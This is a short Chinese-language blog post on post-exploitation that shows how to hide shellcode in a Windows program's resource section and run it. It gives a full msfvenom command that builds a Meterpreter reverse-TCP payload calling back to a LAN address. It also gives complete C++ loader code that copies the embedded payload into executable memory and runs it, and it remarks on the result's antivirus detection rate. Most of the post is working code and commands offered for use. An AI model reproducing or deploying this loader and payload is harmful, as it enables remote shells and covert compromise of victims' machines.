---
title: 通过资源文件加载Shellcode
date: 2020-12-25 13:51:10
tags: 
- Shellcode
- 后渗透
---









### 0x01 生成Shellcode

``` 
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.86.133 LPORT=12345 >payload.bin
```

### 0x02 添加资源文件

右键`资源文件>添加>资源`添加我们刚刚生成的Shellcode

![image-20201225140005634](image-20201225140005634.png)

选择`导入`，添加`payload.bin`

![image-20201225140229778](image-20201225140229778.png)

![image-20201225140458518](image-20201225140458518.png)

我们可以在资源文件中看到我们的bin文件已经被加载

![image-20201225140603313](image-20201225140603313.png)

代码：

``` c++
#include <iostream>
#include <Windows.h>
#include "resource.h"

int main()
{
	// IDR_METERPRETER_BIN1 - is the resource ID - which contains ths shellcode
	// METERPRETER_BIN is the resource type name we chose earlier when embedding the meterpreter.bin
	HRSRC shellcodeResource = FindResource(NULL, MAKEINTRESOURCE(IDR_PAYLOAD_BIN1), L"PAYLOAD_BIN");
	DWORD shellcodeSize = SizeofResource(NULL, shellcodeResource);
	HGLOBAL shellcodeResouceData = LoadResource(NULL, shellcodeResource);

	void* exec = VirtualAlloc(0, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(exec, shellcodeResouceData, shellcodeSize);
	((void(*)())exec)();

	return  0;
}
```



### 0x03 编译和验证

编译成功没有什么问题

![image-20201225141139791](image-20201225141139791.png)

生成的exe放到虚拟机里运行一下，成功

![image-20201225141256996](image-20201225141256996.png)

免杀率……将就吧，毕竟并没有做什么免杀的措施，只是一种加载shellcode的技巧而已

![image-20201225141643919](image-20201225141643919.png)